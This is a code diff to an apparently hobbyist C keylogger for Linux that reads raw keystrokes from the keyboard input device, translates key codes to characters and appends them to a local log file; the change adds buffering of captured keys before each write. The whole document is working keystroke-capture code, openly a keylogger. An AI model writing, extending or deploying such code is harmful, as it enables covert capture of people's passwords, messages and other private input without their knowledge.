@@ -8,6 +8,8 @@
 #include "./key.h"
 #include "./keylogger.h"
 
+#define str_len 100
+
 int logger(){
     const char *dev = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
     int fd;
@@ -20,7 +22,8 @@ int logger(){
     struct input_event ev;
     ssize_t n;
     keys *k = initialize_keys(); 
-    int i = 0;
+    int i = 0, len = 0, ret;
+    char str[str_len] = "";
 
     while(1){
         n = read(fd, &ev, sizeof ev); /* read buffer */
@@ -29,7 +32,16 @@ int logger(){
             while(i < 48){
                 if(ev.code == k -> id[i]){
                     //printf("tasto premuto: %s\n", k -> ch[i]);
-                    w_log("./log", k -> ch[i]);
+                    len = len + k -> len[i];
+                    strcat(str, k -> ch[i]);
+                    
+                    if(len >= str_len - 15){
+                        ret = w_log("./log", str);
+                        //printf("\n\n%d\n\n", len); 
+                        len = 0;
+                        strcpy(str, "");
+                    }
+
                     break;
                 }
                 i++;
@@ -51,7 +63,6 @@ int w_log(char *path, char *str){
     }
         
     fprintf(f, "%s", str);
-
     fclose(f);
 
     return 0;
